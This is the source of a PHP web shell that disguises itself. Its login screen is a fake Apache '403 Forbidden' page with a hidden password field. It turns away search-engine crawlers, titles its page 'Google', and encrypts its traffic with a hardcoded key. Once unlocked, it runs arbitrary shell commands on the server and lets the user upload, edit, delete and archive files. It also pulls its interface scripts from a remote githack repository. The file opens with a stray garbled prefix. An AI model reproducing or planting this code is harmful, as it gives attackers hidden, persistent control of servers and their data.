base_decode("<?php


class CustomCommands
{

    public static function hi($a)
    {
        return 'Hi ' . implode(' ', $a);
    }

}

class TerminalPHP
{
    private $blocked_commands = [
        /*'mkdir',
        'rm',
        'git',
        'wget',
        'curl',
        'chmod',
        'rename',
        'mv',
        'cp'*/
    ];


    public function __construct($path = '')
    {
        $this->_cd($path);
    }


    private function shell($cmd)
    {
        $output = $this->ex($cmd);

        if ($output == '') {
            return $this->ex("{$cmd} 2>&1");
        }
        return $output;
    }

    private function ex($in)
    {
        $output = '';
        if (function_exists('exec')) {
            @exec($in, $result);
            $output = @join("\n", $result);
        } elseif (function_exists('passthru')) {
            ob_start();
            @passthru($in);
            $output = ob_get_clean();
        } elseif (function_exists('system')) {
            ob_start();
            @system($in);
            $output = ob_get_clean();
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec($in);
        } elseif (is_resource($f = @popen($in, "r"))) {
            $output = '';
            while (!@feof($f)) {
                $output .= fread($f, 1024);
            }
            pclose($f);
        } else {
            return "↳ Unable to execute command\n";
        }

        // var_dump("ec " . $output);

        return $output;
    }


    /**
     * Check Command Exists
     * @param $command string command to check
     * @return bool
     */
    private function commandExists($command)
    {
        if ($this->shell('command -v ' . $command))
            return true;
        return false;
    }


    public function __call($cmd, $arg)
    {
        return $this->runCommand($cmd . (isset($arg[0]) ? ' ' . $arg[0] : ''));
    }

    /**
     * Run Command in Terminal
     * @param $command string command to run
     * @return string
     */
    public function runCommand($command)
    {
        $cmd = explode(' ', $command)[0];
        $arg = count(explode(' ', $command)) > 1 ? implode(' ', array_slice(explode(' ', $command), 1)) : '';

        if (array_search($cmd, $this->getLocalCommands()) !== false) {
            $lcmd = '_' . $cmd;
            return $this->$lcmd($arg);
        } else if (array_search($cmd, $this->blocked_commands) !== false)
            return ' Permission denied';
        else if ($this->commandExists($cmd))
            return trim($this->shell($command));
        else
            return ' command not found: ' . $cmd;
    }

    public function normalizeHtml($input)
    {
        return str_replace(['<', '>', "\n", "\t", ' '], ['&lt;', '&gt;', '<br>', '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;', '&nbsp;'], $input);
    }

    /**
     * Array of Local Commands
     * @return array
     */
    private function getLocalCommands()
    {
        $commands = array_filter(get_class_methods($this), function ($i) {
            return ($i[0] == '_' && $i[1] != '_') ? true : false;
        });
        foreach ($commands as $i => $command)
            $commands[$i] = substr($command, 1);
        return $commands;
    }

    /**
     * Array of All Commands
     * @return array
     */
    public function commandsList()
    {
        return array_merge(explode("\n", $this->ls('/usr/bin')), get_class_methods('CustomCommands'));
    }


    private function _cd($path)
    {
        if ($path)
            chdir($path);
        return '';
    }


    private function _pwd()
    {
        return getcwd();
    }

    private function _ping($a)
    {
        if (strpos($a, '-c ') !== false)
            return trim(shell('ping ' . $a));

        return trim(shell('ping -c 4 ' . $a));
    }
}

/* Check if Request is Ajax */
if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && isset($_POST['command'])) {
    $command = explode(' ', $_REQUEST['command'])[0];
    $arguments = array_slice(explode(' ', $_REQUEST['command']), 1);
    $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';

    $terminal = new TerminalPHP($path);

    if (array_search($command, get_class_methods('CustomCommands')) !== false)
        print_r(json_encode((object) ['result' => CustomCommands::$command($arguments), 'path' => $terminal->pwd()]));
    else
        print_r(json_encode((object) ['result' => $terminal->normalizeHtml($terminal->runCommand($_REQUEST['command'])), 'path' => $terminal->pwd()]));
    exit;
}
error_reporting(0);
ini_set('error_log', '');
session_start([
    'cookie_secure' => true, // Only send cookies over HTTPS
    'cookie_httponly' => true, // Prevent JavaScript access to cookies
    'use_strict_mode' => true // Prevent session fixation
]);

ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '256M');
ini_set('max_input_time', 300);
ini_set('max_execution_time', 3000);

header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");
header("X-XSS-Protection: 1; mode=block");

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

define('IsEnc', '1');
define('ENCRYPTION_KEY', 'mysecretkey12345');
$ps = '$2y$10$HuaW7Lm4IdvW5C3RrnL2l.4trvySxRmQ4IU5rXKhGMkNTpXUCfCzK';

function lg(): never
{
    if (!empty($_SERVER['HTTP_USER_AGENT'])) {
        $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
        if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
            header('HTTP/1.0 403 Forbidden');
            exit;
        }
    }
    die("<html><head>     <title>403 Forbidden</title>     </head><body>     <h1>Forbidden</h1>     <p>You don't have permission to access /     on this server.</p>     <hr>     <address>Apache/2.4.25 Server at 127.0.0.1 Port 80</address>         <br><br><br><br><br><style>  input { margin:0;background-color:#fff;border:0px solid #fff; }          </style>          <pre align=center>          <form method=post>          <input type=password name=pass>          </form></pre></body></html>");
}

function setLog(): void
{
    $_SESSION['isLog'] = true;
}


function isLog(): bool
{
    return isset($_SESSION['isLog']) && $_SESSION['isLog'] === true;
}


if (isset($_REQUEST['pass'])) {
    if (password_verify($_REQUEST['pass'], $ps)) {
        setLog();
        header('Location: ' . $_SERVER['PHP_SELF']);
    } else {
        lg();
    }
}

if (!isLog())
    lg();



$terminal = new TerminalPHP();
function sanitizeInput($data)
{
    return htmlspecialchars(stripslashes(trim($data)), ENT_QUOTES, 'UTF-8');
}


function decrypt($encryptedData)
{
    $decodedData = base64_decode($encryptedData);
    $de = openssl_decrypt($decodedData, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
    if ($de === false) {
        echo encrypt(json_encode(['error' => 'error decryption server_side']));
        exit;
    }

    return $de;
}



function encrypt($message)
{
    if (IsEnc == 1) {
        $encryptedData = openssl_encrypt($message, 'AES-128-ECB', ENCRYPTION_KEY, OPENSSL_RAW_DATA);
        echo base64_encode($encryptedData);
        exit;
    } else {

        echo $message;
        exit;
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {

        $encodedData = file_get_contents('php://input');
        $data = (IsEnc == 1 && empty($_FILES)) ? decrypt($encodedData) : $encodedData;
        $array = json_decode($data, true);
        $_POST = [
            'csrf' => sanitizeInput($array['csrf'] ?? ''),
            'action' => sanitizeInput($array['action'] ?? ''),
            'dir' => sanitizeInput($array['dir'] ?? ''),
            'page' => sanitizeInput($array['page'] ?? ''),
            'itemsPerPage' => sanitizeInput($array['itemsPerPage'] ?? ''),
            'oldName' => sanitizeInput($array['oldName'] ?? ''),
            'newName' => sanitizeInput($array['newName'] ?? ''),
            'file' => (IsEnc == 1) ? ($array['file'] ?? '') : ($array['file'] ?? ''),
            'zipExt' => sanitizeInput($array['zipExt'] ?? ''),
            'touch' => sanitizeInput($array['touch'] ?? ''),
            'mkdir' => sanitizeInput($array['mkdir'] ?? ''),
            'dirName' => sanitizeInput($array['dirName'] ?? ''),
            'srcPath' => sanitizeInput($array['srcPath'] ?? ''),
            'content' => ($array['content'] ?? ''),

        ];


    } catch (\Throwable $th) {
        var_dump(json_encode(['error' => "An error occurred: " . $th->getMessage()]));
        exit;
    }
}


$os = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? 'win' : 'nix';
$home_cwd = @getcwd();
if (isset($_POST['c']))
    @chdir($_POST['c']);
$cwd = @getcwd();
if ($os == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
}
if ($cwd[strlen($cwd) - 1] != '/')
    $cwd .= '/';

$home_cwd = realpath(($home_cwd));

function printFile($fileListToShow, $totalPages, $currentPage, $totalItems)
{

    $response = json_encode([
        'files' => $fileListToShow,
        'totalPages' => $totalPages,
        'currentPage' => $currentPage,
        'totalItems' => $totalItems,
    ]);
    switch (IsEnc) {
        case 1:
            return encrypt($response);
        default:
            return $response;
    }
}

$itemsPerPageInput = isset($_POST['itemsPerPage']) ? $_POST['itemsPerPage'] : '50';

if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest' && isset($_POST['command'])) {
    $command = explode(' ', $_REQUEST['command'])[0];
    $arguments = array_slice(explode(' ', $_REQUEST['command']), 1);
    $path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '';

    $terminal = new TerminalPHP($path);

    if (array_search($command, get_class_methods('CustomCommands')) !== false)
        print_r(json_encode((object) ['result' => CustomCommands::$command($arguments), 'path' => $terminal->pwd()]));
    else
        print_r(json_encode((object) ['result' => $terminal->normalizeHtml($terminal->runCommand($_REQUEST['command'])), 'path' => $terminal->pwd()]));
    exit;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $action = $_POST['action'];
    // $currentDir = isset($_POST['dir']) ? $_POST['dir'] : '.';
    $currentDir = @realpath($_POST['dir'] ?? '.');   /// it was _POST 

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {

        $uploadDir = @realpath($_REQUEST['updir'] ?? '.');

        $uploadedFiles = [];
        foreach ($_FILES['files']['tmp_name'] as $key => $tmpName) {
            $fileName = basename($_FILES['files']['name'][$key]);
            $uploadFilePath = $uploadDir . "/" . $fileName;

            if (move_uploaded_file($tmpName, $uploadFilePath)) {
                $uploadedFiles[] = $fileName;
            } else {

                echo json_encode(['success' => false, 'error' => "Error uploading file: $uploadFilePath"]);
                exit;
            }
        }

        if (!empty($uploadedFiles)) {
            echo json_encode(['success' => true, 'files' => $uploadDir]);
        } else {
            echo json_encode(['success' => false, 'error' => 'No files were uploaded.']);
        }
        exit;
    }


    if ($_POST['csrf'] !== $_SESSION['csrf_token']) {
        echo encrypt(json_encode(['files' => [[]], 'error' => 'invalid csrf']));
        exit;
    }

    if ($currentDir === false) {
        echo encrypt(['error' => 'Invalid directory']);
        exit;
    }


    if ($action === 'list') {
        // Assume $directory is your current directory being listed.
        $directory = isset($_POST['dir']) ? $_POST['dir'] : '.';

        $files = @scandir($currentDir);
        if ($files === false) {
            // handle error (e.g., directory not accessible)
            echo encrypt(['error' => 'Cannot read directory']);
            exit;
        }


        $fileList = [];

        foreach ($files as $file) {
            // remove .. and . from scandir get current and previous dir 
            if ((basename($file) == "..") || (basename($file) == "."))
                continue;
            $filePath = $currentDir . '/' . $file;
            $fileInfo = getFileDetails($filePath);
            $fileInfo['icon'] = getFileIcon($fileInfo);
            $fileList[] = $fileInfo; // Build the file list for JSON response
        }

        $totalItems = count($fileList); // Total number of files
        $itemsPerPage = strtolower($itemsPerPageInput) === 'infinity' ? $totalItems : (int) $itemsPerPageInput;
        $itemsPerPage = max($itemsPerPage, 1); // Ensure at least 1 item per page

        $totalPages = ($itemsPerPage === $totalItems || $totalItems === 0) ? 1 : ceil($totalItems / $itemsPerPage);
        $currentPage = isset($_POST['page']) ? (int) $_POST['page'] : 1;
        $currentPage = min(max($currentPage, 1), $totalPages); // Ensure current page is within bounds

        $offset = ($currentPage - 1) * $itemsPerPage;
        $fileListToShow = array_slice($fileList, $offset, $itemsPerPage);

        echo printFile($fileListToShow, $totalPages, $currentPage, $totalItems);
        exit;
    } elseif ($action === 'delete') {
        $fileToDelete = $_POST['file'] ?? '';

        $filesToDelete = is_array($fileToDelete) ? $fileToDelete : [$fileToDelete];
        $errDel;
        foreach ($filesToDelete as $file) {
            // Construct the full path

            $file = str_replace('//', '/', $file);

            $fullPath = $file;
            $fullPath2 = $currentDir . "/" . $file;    // hundle singe file
            if ((basename($fullPath) == "..") || (basename($fullPath) == "."))
                continue;

            // var_dump(value: $currentDir.$fullPath);exit;
            // Check if the file or directory exists
            if (file_exists(filename: $fullPath)) {
                del($fullPath);
                $errDel = 0;
            } elseif (file_exists(filename: $fullPath2)) {
                del($fullPath2);
                $errDel = 0;

            } else {
                $errDel = 1;
            }
        }
        if ($errDel == 0)
            echo printFile([], 0, 0, 0);
        else
            echo encrypt(['error' => 'File not found']);

        exit;

    } elseif ($action === 'rename') {
        $oldName = $_POST['oldName'] ?? '';
        $newName = $_POST['newName'] ?? '';
        $oldPath = $currentDir . '/' . $oldName;
        $newPath = $currentDir . '/' . $newName;
        // die($currentDir);
        if (
            !file_exists($oldPath)
            || !is_writable($currentDir)
        ) {
            echo encrypt(json_encode(['error' => 'File not found']));

        } else {
            if (@rename($oldPath, $newPath))

                echo encrypt(json_encode(['1' => '1']));


        }

    } elseif ($action === 'paste') {
        // Handle file paste (copy/move)
        $filesToPaste = $_POST['file'] ?? [];
        $destinationDir = $_POST['dir'] ?? '';

        if (empty($filesToPaste)) {
            echo encrypt(json_encode(['error' => 'No files to paste']));
            exit;
        }

        if (empty($destinationDir) || !is_dir($destinationDir)) {
            echo encrypt(json_encode(['error' => 'Invalid destination directory']));

            exit;
        }
        echo copyFilesOrFolders($filesToPaste, $destinationDir);


        exit;
    } elseif ($action === 'zip') {

        $filesToArchive = $_POST['file'] ?? [];
        $filesToArchive = array_map('realpath', $filesToArchive);
        $zipFilename = $_POST['zipExt'] ?? 'archive.zip';
        $destinationPath = $currentDir . '/' . $zipFilename;

        $zipExt = pathinfo($zipFilename, PATHINFO_EXTENSION);

        function addFolderToZip($folder, $zip, $parentFolder = '')
        {
            $folderName = $parentFolder . basename($folder) . '/';
            $zip->addEmptyDir($folderName);

            foreach (scandir($folder) as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }

                $path = $folder . DIRECTORY_SEPARATOR . $item;
                if (is_dir($path)) {
                    addFolderToZip($path, $zip, $folderName);
                } elseif (is_file($path)) {
                    $zip->addFile($path, $folderName . basename($path));
                }
            }
        }

        switch ($zipExt) {
            case 'zip':

                if (!empty($filesToArchive)) {
                    $zip = new ZipArchive();

                    if ($zip->open($destinationPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                        foreach ($filesToArchive as $file) {
                            $realPath = realpath($file);
                            if ($realPath) {
                                if (is_dir($realPath)) {
                                    addFolderToZip($realPath, $zip);
                                } elseif (is_file($realPath)) {
                                    $zip->addFile($realPath, basename($realPath));
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or folder not found: ' . $file]));
                            }
                        }
                        $zip->close();
                        echo encrypt(json_encode(['success' => 'Zip archive created successfully!']));
                    } else {
                        echo encrypt(json_encode(['error' => 'Failed to create archive']));
                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or folders to zip']));
                }
                break;
            case 'tar':
                if (!empty($filesToArchive)) {
                    try {
                        $tar = new PharData($destinationPath);

                        foreach ($filesToArchive as $file) {
                            $filePath = realpath($file);
                            if ($filePath) {
                                if (is_dir($filePath)) {
                                    $files = new RecursiveIteratorIterator(
                                        new RecursiveDirectoryIterator($filePath, RecursiveDirectoryIterator::SKIP_DOTS),
                                        RecursiveIteratorIterator::LEAVES_ONLY
                                    );

                                    foreach ($files as $fileItem) {
                                        if (!$fileItem->isDir()) {
                                            var_dump($fileItem);
                                            exit;
                                            $fileItemPath = $fileItem->getRealPath();
                                            $relativePath = substr($fileItemPath, strlen($filePath) + 1);
                                            $tar->addFile($fileItemPath, $relativePath);
                                        }
                                    }
                                } elseif (is_file($filePath)) {
                                    $relativePath = basename($filePath);
                                    $tar->addFile($filePath, $relativePath);
                                }
                            } else {
                                echo encrypt(json_encode(['error' => 'File or directory not found']));

                                exit;
                            }
                        }

                        echo encrypt(json_encode(['success' => 'Tar archive created successfully']));

                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error creating tar archive']));

                    }
                } else {
                    echo encrypt(json_encode(['error' => 'No files or directories to archive']));
                }
                break;
            default:
                echo encrypt(json_encode(['error' => 'Unsupported archive format']));
                break;
        }
        exit;
    } elseif ($action === 'unzip') {

        $filesToArchive = $_POST['file'] ?? [];
        $filesToArchive = array_map('realpath', $filesToArchive);
        $zipFilename = $_POST['zipExt'] ?? 'archive.zip';
        $destinationPath = $currentDir . '/' . $zipFilename;

        $zipExt = pathinfo($filesToArchive[0], PATHINFO_EXTENSION);

        if (empty($filesToArchive)) {
            echo encrypt(json_encode(['error' => 'No files selected for archiving']));
            exit;
        }
        switch ($zipExt) {
            case 'zip':
                function extractZip($zipFilePath, $destinationPath)
                {
                    try {

                        foreach ($zipFilePath as $zipFile) {
                            $zip = new ZipArchive();
                            if ($zip->open($zipFile) === TRUE) {
                                $zip->extractTo($destinationPath);
                                $zip->close();
                                echo encrypt(json_encode(['success' => "Zip archive extracted successfully: $zipFile"])) . "\n";
                            } else {
                                echo encrypt(json_encode(['error' => "Failed to open zip archive: $zipFile"])) . "\n";
                            }
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error extracting zip archive: ' . $e->getMessage()])) . "\n";
                    }
                }
                extractZip($filesToArchive, $destinationPath);
                break;

            case 'tar':
                function extractTar($tarFilePath, $destinationPath)
                {
                    try {
                        if (!is_array($tarFilePath)) {
                            $tarFilePath = [$tarFilePath];
                        }
                        foreach ($tarFilePath as $tarFile) {
                            $tar = new PharData($tarFile);

                            $tar->extractTo($destinationPath);

                            echo encrypt(json_encode(['success' => "Tar archive extracted successfully: $tarFile"])) . "\n";
                        }
                    } catch (Exception $e) {
                        echo encrypt(json_encode(['error' => 'Error extracting tar archive: ' . $e->getMessage()])) . "\n";
                    }
                }
                extractTar($filesToArchive, $destinationPath);


                break;

            default:
                echo encrypt(json_encode(['error' => 'Unsupported archive format only zip or tar']));

                break;
        }
        exit;

    } elseif ($action === 'touch') {

        $newF = $_POST['dirName'] ?? "";
        $target = rtrim($currentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newF;


        if (!file_exists($target) && is_writable($currentDir)) {
            $handle = fopen($target, 'w');
            if ($handle) {
                fclose($handle);
                echo encrypt(json_encode(['success' => 'File created successfully']));
            } else {
                echo encrypt(json_encode(['error' => 'Failed to create file']));
            }
        } else {
            echo encrypt(json_encode(['error' => 'File already exists']));
        }
    } elseif ($action === 'mkdir') {
        $newF = $_POST['dirName'] ?? "";
        $target = rtrim($currentDir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $newF;

        if (file_exists($target)) {
            if (is_writable($target)) {

                echo encrypt(json_encode(['error' => 'Directory already exists']));

            } else {

                echo encrypt(json_encode(['error' => 'Directory exists but is not writable']));

            }
        } else {

            if (is_writable($currentDir) && mkdir($target, 0755, true)) {

                echo encrypt(json_encode(value: ['success' => 'Directory created successfully']));

            } else {
                echo encrypt(json_encode(['error' => 'Failed to create directory']));

            }
            exit;
        }
    } elseif ($action === 'view_content') {
        $fileToView = $_POST['file'] ?? '';
        $fullPath = realpath($fileToView);

        if (file_exists($fullPath) && is_file($fullPath)) {
            $content = file_get_contents($fullPath);
            echo encrypt(json_encode(['content' => $content]));

        } else {
            echo encrypt(json_encode(['error' => 'File not found or not a file']));

        }
        exit;
    } elseif ($action === 'save_content') {
        $fileToSave = realpath($_POST['file']) ?? '';
        $content = $_POST['content'] ?? '';
        $fullPath = $fileToSave;

        if (file_exists($fullPath) && is_file($fullPath)) {
            file_put_contents($fullPath, data: $content);
            echo encrypt(json_encode(['success' => 'file saved']));


        } else {
            echo encrypt(json_encode(['error' => 'File not found']));


        }
        exit;
    }

}

function del($target)
{
    if (is_array($target)) {
        foreach ($target as $item) {
            del($item);
        }
    } else {
        if (is_file($target)) {
            unlink($target);
        } elseif (is_dir($target)) {
            array_map('del', glob($target . '/*'));
            rmdir($target);
        }

    }
}

function copyFilesOrFolders($sources, $destination)
{

    $destination = realpath($destination);

    if (!is_writable($destination)) {
        echo encrypt(json_encode(['error' => 'Permission denied']));

    }

    foreach ($sources as $source) {
        $source = realpath($source);
        if (is_file($source)) {
            $fileName = basename($source);
            $destFile = $destination . '/' . $fileName;

            if (copy($source, $destFile)) {
                echo encrypt(json_encode(['success' => 'File copied ' . $destFile]));

            } else {
                echo encrypt(json_encode(['error' => 'file exist']));

            }
        } elseif (is_dir($source)) {
            $dirName = basename($source);
            $destDir = $destination . '/' . $dirName;

            if (!is_dir($destDir)) {
                mkdir($destDir, 0777, true);
            }

            $dir = opendir($source);

            while (($file = readdir($dir)) !== false) {
                if ($file != '.' && $file != '..') {
                    $srcFile = $source . '/' . $file;
                    $destFile = $destDir . '/' . $file;

                    copyFilesOrFolders([$srcFile], $destDir);
                }
            }

            closedir($dir);
        } else {
            echo encrypt(json_encode(['error' => 'Source is not a file or directory']));

        }
    }
}


function addFolderToTar($tar, $folderPath, $baseName)
{
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($folderPath),
        RecursiveIteratorIterator::LEAVES_ONLY
    );

    foreach ($files as $file) {
        if (!$file->isDir()) {
            $filePath = $file->getRealPath();
            $relativePath = $baseName . '/' . substr($filePath, strlen($folderPath) + 1);
            $tar->addFile($filePath, $relativePath);
        }
    }
}

function getFileDetails($path)
{
    global $os;
    $stat = stat($path);
    $owner = $os === 'win' ? 'Windows' : posix_getpwuid($stat['uid'])['name'];
    $group = $os === 'win' ? 'Windows' : posix_getgrgid($stat['gid'])['name'];

    return [
        'name' => basename($path),
        'size' => is_dir($path) ? 'dir' : formatSize($stat['size']),
        'mtime' => date('Y-m-d H:i:s', $stat['mtime']),
        'owner' => $owner . '/' . $group,
        'perms' => getPermissions($path),
        'is_dir' => is_dir($path)
    ];
}

function formatSize($size)
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPermissions($path)
{
    return substr(sprintf('%o', fileperms($path)), -4);
}


function getFileIcon($file)
{
    if ($file['is_dir'])
        return 'fa-folder';
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    switch (strtolower($extension)) {
        case 'pdf':
            return 'fa-file-pdf';
        case 'doc':
        case 'docx':
            return 'fa-file-word';
        case 'xls':
        case 'xlsx':
            return 'fa-file-excel';
        case 'ppt':
        case 'pptx':
            return 'fa-file-powerpoint';
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
            return 'fa-file-image';
        case 'zip':
        case 'rar':
            return 'fa-file-archive';
        case 'txt':
            return 'fa-file-alt';
        case 'php':
        case 'js':
        case 'css':
        case 'html':
            return 'fa-file-code';
        default:
            return 'fa-file';
    }
}

// Initial directory
$phpVars = [
    'csrf' => $_SESSION['csrf_token'],
    'currentDir' => $cwd,
    'isEnc' => IsEnc,
    'encryptionKey' => ENCRYPTION_KEY,
    'terPWD' => $terminal->pwd(),
    'cmList' => (json_encode($terminal->commandsList()))
];






?>
<!doctype html><html lang=en><meta charset=UTF-8><title>Google</title><link href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.css rel=stylesheet crossorigin=anonymous integrity="sha512-8BU3emz11z9iF75b10oPjjpamM4Mz23yQFQymbtwyPN3mNWHxpgeqyrYnkIUP6A8KyAj5k2p3MiYLtYqew7gIw=="referrerpolicy=no-referrer><link href=https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css rel=stylesheet><script src=https://cdn.tailwindcss.com></script><script src=https://code.jquery.com/jquery-3.6.0.min.js async></script><script src=https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js async></script><script src=https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js async></script><script src=https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js async defer></script><script src=https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.js async></script><script src=https://cdn.jsdelivr.net/npm/sweetalert2@11 async></script><script src=https://unpkg.com/monaco-editor@0.45.0/min/vs/loader.js async></script><link href=https://cdnjs.cloudflare.com/ajax/libs/flowbite/2.2.0/flowbite.min.css rel=stylesheet><script>const phpVars =<?php echo json_encode($phpVars); ?>;
        const fileManagerState = {
            currentPage: 1,
            totalPages: 1,
            isLoading: false,
            currentSort: { column: 'name', direction: 'asc' },
            files: [],
            clipboard: { action: "", path: [] },
            selectedFiles: [],

        };
        let isLoading = false;</script><script src=https://rawcdn.githack.com/fx510/mian/refs/heads/main/utils-mini.js></script><script src=https://rawcdn.githack.com/fx510/mian/refs/heads/main/main-min.js></script><body class="bg-gray-100 dark:bg-gray-900 duration-300 transition"><div id=app><header class="dark:bg-gray-800 bg-white border-b font-sans min-h-[60px] px-10 py-3 relative tracking-wide z-50"><div class="flex items-center flex-wrap gap-x-4 gap-y-6"><div class="hidden lg:flex lg:items-center lg:justify-center"id=collapseMenu><ul class="lg:flex lg:gap-x-10"id=goHome><li class="max-lg:border-b max-lg:py-3"><a class="font-bold block hover:text-[#007bff] text-[#007bff] text-[15px]"href=javascript:void(0)><i class="fas fa-home mr-2"></i></a></ul></div><div class="flex flex-wrap font-medium text-center text-sm dark:text-gray-400 text-gray-500"><ul class="flex flex-wrap font-medium text-center text-sm -mb-px"id=default-tab data-tabs-toggle=#default-tab-content role=tablist><button class="p-4 border-b-2 inline-block rounded-t-lg"id=file-tab aria-controls=file aria-selected=false data-tabs-target=#file role=tab type=button>files</button><li class=me-2 role=presentation><button class="p-4 border-b-2 inline-block rounded-t-lg dark:hover:text-gray-300 hover:border-gray-300 hover:text-gray-600"id=upload-tab aria-controls=upload aria-selected=false data-tabs-target=#upload role=tab type=button>upload</button><li class=me-2 role=presentation><button class="p-4 border-b-2 inline-block rounded-t-lg dark:hover:text-gray-300 hover:border-gray-300 hover:text-gray-600"id=terminal-tab aria-controls=terminal aria-selected=false data-tabs-target=#terminal role=tab type=button>terminal</button><li role=presentation><button class="p-4 border-b-2 inline-block rounded-t-lg dark:hover:text-gray-300 hover:border-gray-300 hover:text-gray-600"id=setting-tab aria-controls=setting aria-selected=false data-tabs-target=#setting role=tab type=button>setting</button></ul></div><div class="flex items-center ml-auto space-x-8"><div class="flex items-center border border-gray-300 focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500 rounded-full shadow-sm"><i class="fas fa-search ml-4 text-gray-600"></i> <input type=search class="flex-grow bg-transparent border-none focus:outline-none placeholder-gray-400 px-4 py-2 text-gray-700"id=searchBar aria-label=Search placeholder=Search...></div></div></div></header><div x-data="{ 
    alertType: '', 
    alertMessage: '', 
    alertIsVisible: false,
    alertIcon: '',
    alertTitle: ''
}"x-init="
    document.addEventListener('show-alert', event => {
        const { type, message } = event.detail;
        alertType = type;
        alertMessage = message;
        alertIsVisible = true;

        switch(type) {
            case 'info':
                alertIcon = 'info-circle';
                alertTitle = 'Information';
                break;
            case 'success':
                alertIcon = 'check-circle';
                alertTitle = 'Success';
                break;
            case 'warning':
                alertIcon = 'exclamation-triangle';
                alertTitle = 'Warning';
                break;
            case 'danger':
                alertIcon = 'times-circle';
                alertTitle = 'Danger';
                break;
        }

        setTimeout(() => {
            alertIsVisible = false;
        }, 5000); // Auto-hide after 5 seconds
    });
"><div class="w-full border rounded-md -translate-x-1/2 duration-300 fixed left-1/2 max-w-sm shadow-lg top-4 transform transition-transform z-50"role=alert :class="{
             'bg-blue-100 border-blue-300 text-blue-800': alertType === 'info',
             'bg-green-100 border-green-300 text-green-800': alertType === 'success',
             'bg-yellow-100 border-yellow-300 text-yellow-800': alertType === 'warning',
             'bg-red-100 border-red-300 text-red-800': alertType === 'danger'
         }"x-show=alertIsVisible x-transition:leave="transition ease-in duration-300"x-transition:leave-end="opacity-0 scale-90"x-transition:leave-start="opacity-100 scale-100"><div class="flex items-center p-4"><div class="rounded-full mr-3 p-2":class="{
                    'bg-blue-200 text-blue-600': alertType === 'info',
                    'bg-green-200 text-green-600': alertType === 'success',
                    'bg-yellow-200 text-yellow-600': alertType === 'warning',
                    'bg-red-200 text-red-600': alertType === 'danger'
                }"><i :class="'fas fa-' + alertIcon"></i></div><div class=flex-grow><h3 :class="{
                        'text-blue-800': alertType === 'info',
                        'text-green-800': alertType === 'success',
                        'text-yellow-800': alertType === 'warning',
                        'text-red-800': alertType === 'danger'
                    }"class=font-semibold x-text=alertTitle></h3><p class=text-sm x-text=alertMessage></div><button class="hover:text-gray-600 ml-3 text-gray-500"@click="alertIsVisible = false"><i class="fas fa-times"></i></button></div></div></div><div class="bg-gray-100 dark:bg-gray-900 container mx-auto p-8"><nav aria-label=Breadcrumb class="flex border bg-gray-50 border-gray-200 dark:bg-gray-800 dark:border-gray-700 mb-4 px-5 py-3 rounded-lg text-gray-700"id=breadcrumbs><ol class="inline-flex items-center md:space-x-2 rtl:space-x-reverse space-x-1"><li class="inline-flex items-center"><a class=breadcrumb-link href=# data-path=/ ><i class="fas fa-home mr-2"></i> /</a></ol></nav><div id=default-tab-content><div class="p-4 hidden bg-gray-50 dark:bg-gray-800 rounded-lg"id=file aria-labelledby=home-tab role=tabpanel><div class="flex items-center dark:text-gray-300 gap-4 mb-4 relative text-gray-800 w-full"><select class="dark:bg-gray-800 border appearance-none bg-gray-200 border-gray-500 dark:border-gray-500 disabled:cursor-not-allowed dark:focus:ring-sky-400 dark:text-gray-300 disabled:opacity-75 focus:outline-none focus:ring-2 focus:ring-sky-900 max-w-xs px-2 py-1 rounded-md text-xs w-full"id=bulkActions name=bulkActions><option value=""disabled selected>actions<option value=delete>Delete<option value=zip>zip<option value=unzip>unzip<option value=copy>copy<option value=paste>paste</select><div class="relative group"><i class="cursor-pointer dark:text-gray-300 fa-solid text-gray-800 fa-folder-plus text-lg"></i> <span class="hidden -translate-x-1/2 absolute bg-gray-900 dark:bg-gray-700 dark:text-gray-200 group-hover:block group-hover:opacity-100 left-1/2 mt-1 opacity-0 px-2 py-1 rounded-md shadow-md text-white text-xs top-full w-max">Create Folder</span></div><div class="relative group"><i 